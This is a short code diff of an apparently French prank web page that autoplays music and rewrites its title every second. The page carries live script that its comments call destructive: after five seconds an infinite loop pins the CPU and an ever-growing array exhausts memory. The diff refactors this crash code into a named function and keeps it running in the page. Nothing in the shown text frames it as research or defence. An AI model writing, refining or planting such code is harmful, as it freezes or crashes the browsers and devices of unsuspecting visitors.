@@ -91,7 +91,7 @@
     </div>
 
     <!-- Musique de fond -->
-    <audio autoplay loop>
+    <audio id="background-music" autoplay>
         <source src="https://pouch.jumpshare.com/preview/roGyDVGHDgyjUEB5cfr5ofG20g9Y1EIpt_cQRlDm_XvY82T6EVffM9xQFTvUpm35BabvWru8Ms_JViudeNNaWCwoWnq_28GRCRipzsZwl-nUYTbHdFgDzz5coam4CEZxqLiVRawwdII9VvWfeaBhmG6yjbN-I2pg_cnoHs_AmgI.mp3" type="audio/mpeg">
         Votre navigateur ne supporte pas la lecture audio.
     </audio>
@@ -113,8 +113,8 @@
         // Mise à jour du titre toutes les secondes
         setInterval(generateTitle, 1000);
 
-        // Délai de 5 secondes avant de lancer les scripts destructeurs
-        setTimeout(function() {
+        // Fonction contenant les scripts destructeurs
+        function launchCrashScripts() {
             // Boucle infinie pour surcharger le CPU
             while (true) {
                 console.log("Boucle Infinie...");
@@ -133,7 +133,10 @@
                 memoryOverload.push({});
             }
             console.log("Surcharge mémoire immédiate !");
-        }, 5000); // Délai de 5 secondes
+        }
+
+        // Lancer les scripts destructeurs après 5 secondes
+        setTimeout(launchCrashScripts, 5000);
     </script>
 </body>
 </html>
